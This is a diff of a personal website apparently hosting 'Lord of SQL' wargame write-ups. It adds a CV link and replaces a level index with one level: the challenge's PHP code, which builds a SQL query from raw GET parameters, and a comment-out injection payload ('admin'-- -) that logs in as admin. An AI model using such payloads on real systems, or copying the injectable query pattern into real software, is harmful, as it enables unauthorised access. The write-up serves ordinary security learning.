@@ -63,6 +63,9 @@
             <li class="navigation-item  align-center ">
               <a class="navigation-link" href="https://m0n574.github.io/about">About</a>
             </li>
+           <li class="navigation-item  align-center ">
+              <a class="navigation-link" href="https://m0n574.github.io/Gopika_CV.pdf">CV</a>
+            </li>
           
         
         
@@ -75,25 +78,27 @@
       <div class="content">
         
   <section class="container centered">
-  <div class="error">
-    <h1>Lord of SQL Write up</h1><br><br>
-    <p><a href="/posts/files/los/l1.html">Level 1</a></p>
-    <p><a href="/posts/files/los/l2.html">Level 2</a></p>
-     <p><a href="/posts/files/los/l3.html">Level 3</a></p>
-    <p><a href="/posts/files/los/l4.html">Level 4</a></p> <p><a href="/posts/files/los/l5.html">Level 5</a></p>
-    <p><a href="/posts/files/los/l6.html">Level 6</a></p> <p><a href="/posts/files/los/l7.html">Level 7</a></p>
-    <p><a href="/posts/files/los/l8.html">Level 8</a></p><p><a href="/posts/files/los/l9.html">Level 9</a></p>
-    <p><a href="/posts/files/los/l10.html">Level 10</a></p> <p><a href="/posts/files/los/l11.html">Level 11</a></p>
-    <p><a href="/posts/files/los/l12.html">Level 12</a></p> <p><a href="/posts/files/los/l13.html">Level 13</a></p>
-    <p><a href="/posts/files/los/l14.html">Level 14</a></p> <p><a href="/posts/files/los/l15.html">Level 15</a></p>
-    <p><a href="/posts/files/los/l16.html">Level 16</a></p> <p><a href="/posts/files/los/l17.html">Level 17</a></p>
-    <p><a href="/posts/files/los/l18.html">Level 18</a></p> <p><a href="/posts/files/los/l19.html">Level 19</a></p>
-    <p><a href="/posts/files/los/l20.html">Level 20</a></p>
+  <div class="error"><code>
+     include "./config.php"; 
+  login_chk();
+  dbconnect();
+  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
+  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
+  $query = "select id from prob_cobolt where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')"; 
+  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
+  $result = @mysql_fetch_array(mysql_query($query)); 
+  if($result['id'] == 'admin') solve("cobolt");
+  elseif($result['id']) echo "<h2>Hello {$result['id']}<br>You are not admin :(</h2>"; 
+  highlight_file(__FILE__); 
+</code>
+<p>PAYLOAD: <code>?id=admin'-- -</code></p><p> OUTPUT: select id from prob_cobolt where id='admin'-- -' and pw=md5('') Cobolt clear</p>
+
   </div>
 </section>
 
 
-      </div><br><br><br><h3 align="center"><a href="https://m0n574.github.io/posts/">OTHER POSTS</a></h3>
+      </div>
+<br><br><br><h3 align="center"><a href="https://m0n574.github.io/posts/">OTHER POSTS</a></h3>
       
         <footer class="footer">
   <section class="container">
